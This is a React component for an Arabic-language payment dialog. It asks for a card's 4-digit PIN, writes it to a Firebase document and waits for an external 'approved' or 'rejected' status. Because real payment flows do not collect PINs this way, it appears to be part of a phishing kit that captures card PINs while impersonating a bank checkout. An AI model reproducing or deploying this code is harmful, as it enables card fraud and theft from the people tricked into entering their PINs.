"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Loader2, CheckCircle2, XCircle, Lock } from "lucide-react"
import { updatePin, listenForApproval } from "@/lib/firebase"

interface PinDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  onPinSubmitted: () => void
  documentId?: string
}

type PinStatus = "idle" | "waiting" | "approved" | "rejected"

export function PinDialog({ open, onOpenChange, onPinSubmitted, documentId }: PinDialogProps) {
  const [pin, setPin] = useState("")
  const [status, setStatus] = useState<PinStatus>("idle")
  const [error, setError] = useState("")

  // Reset state when dialog opens/closes
  useEffect(() => {
    if (!open) {
      setPin("")
      setStatus("idle")
      setError("")
    }
  }, [open])

  // Listen for final approval status changes
  useEffect(() => {
    if (!documentId || status !== "waiting") return

    const unsubscribe = listenForApproval(documentId, (newStatus) => {
      if (newStatus === "approved") {
        setStatus("approved")
        setTimeout(() => {
          onPinSubmitted()
        }, 2000)
      } else if (newStatus === "rejected") {
        setStatus("rejected")
        setError("تم رفض العملية. يرجى التواصل مع البنك.")
      }
    })

    return () => unsubscribe()
  }, [documentId, status, onPinSubmitted])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (pin.length < 4) {
      setError("يرجى إدخال رقم PIN صحيح")
      return
    }

    if (!documentId) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى")
      return
    }

    try {
      setStatus("waiting")
      setError("")
      await updatePin(documentId, pin)
      // Now waiting for Firestore approval status to change
    } catch (err) {
      setStatus("idle")
      setError("حدث خطأ. يرجى المحاولة مرة أخرى")
    }
  }

  const handleRetry = () => {
    setPin("")
    setStatus("idle")
    setError("")
  }

  return (
    <Dialog open={open} onOpenChange={status === "waiting" ? undefined : onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2 text-xl">
            <Lock className="w-6 h-6 text-[#0a4a68]" />
            إدخال رقم PIN
          </DialogTitle>
          <DialogDescription className="text-base">أدخل رقم PIN الخاص ببطاقتك لإتمام العملية</DialogDescription>
        </DialogHeader>

        {status === "waiting" && (
          <div className="flex flex-col items-center justify-center py-8 space-y-4">
            <div className="relative">
              <Loader2 className="w-16 h-16 text-[#0a4a68] animate-spin" />
            </div>
            <p className="text-lg font-semibold text-gray-700">جاري معالجة الدفع...</p>
            <p className="text-sm text-gray-500 text-center">يرجى الانتظار، قد تستغرق العملية بضع ثوانٍ</p>
          </div>
        )}

        {status === "approved" && (
          <div className="flex flex-col items-center justify-center py-8 space-y-4">
            <CheckCircle2 className="w-16 h-16 text-green-500" />
            <p className="text-lg font-semibold text-green-700">تمت العملية بنجاح!</p>
            <p className="text-sm text-gray-600 text-center">شكراً لك. تم إتمام عملية الدفع بنجاح.</p>
          </div>
        )}

        {status === "rejected" && (
          <div className="flex flex-col items-center justify-center py-8 space-y-4">
            <XCircle className="w-16 h-16 text-red-500" />
            <p className="text-lg font-semibold text-red-700">فشلت العملية</p>
            <p className="text-sm text-red-600 text-center">{error}</p>
            <Button onClick={handleRetry} variant="outline" className="mt-4 bg-transparent">
              المحاولة مرة أخرى
            </Button>
          </div>
        )}

        {status === "idle" && (
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Input
                type="password"
                placeholder="****"
                value={pin}
                onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
                className="h-14 text-center text-2xl font-mono tracking-widest border-2 rounded-xl focus:border-[#0a4a68]"
                maxLength={4}
                autoFocus
              />
              {error && <p className="text-sm text-red-600 text-center">{error}</p>}
            </div>

            <Button
              type="submit"
              disabled={pin.length < 4}
              className="w-full h-12 bg-[#0a4a68] hover:bg-[#083a54] text-white font-bold rounded-xl"
            >
              تأكيد الدفع
            </Button>

            <p className="text-xs text-gray-500 text-center">رقم PIN هو الرقم السري المكون من 4 أرقام الخاص ببطاقتك</p>
          </form>
        )}
      </DialogContent>
    </Dialog>
  )
}
